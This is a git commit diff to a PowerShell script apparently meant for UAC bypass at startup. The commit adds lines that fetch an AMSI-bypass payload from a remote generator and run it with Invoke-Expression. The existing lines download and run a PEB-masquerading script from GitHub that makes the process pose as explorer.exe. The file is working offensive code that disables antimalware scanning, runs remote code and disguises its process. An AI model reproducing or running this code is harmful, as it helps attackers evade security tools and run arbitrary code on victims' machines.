646e9e83a840d21fb0d7fe2b287bb3d2fe59b3f0
GєṭRєҡṭBȏʏ724/ <virusleader324@gmail.com>
2021-03-09 21:37:06 +0700

    Update UACBStartup2.ps1

--- UACBStartup2.ps1
+++ UACBStartup2.ps1
@@ -1,3 +1,5 @@
+$accessAMBY = Invoke-WebRequest https://amsi-fail.azurewebsites.net/api/Generate -UseBasicParsing
+Invoke-Expression $accessAMBY.Content
 Invoke-Expression(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/GetRektBoy724/sementara/master/Masquerade-PEB.ps1');
 MPEB -BinPath "C:\Windows\explorer.exe"
 MPEB -BinPath "C:\Windows\explorer.exe"
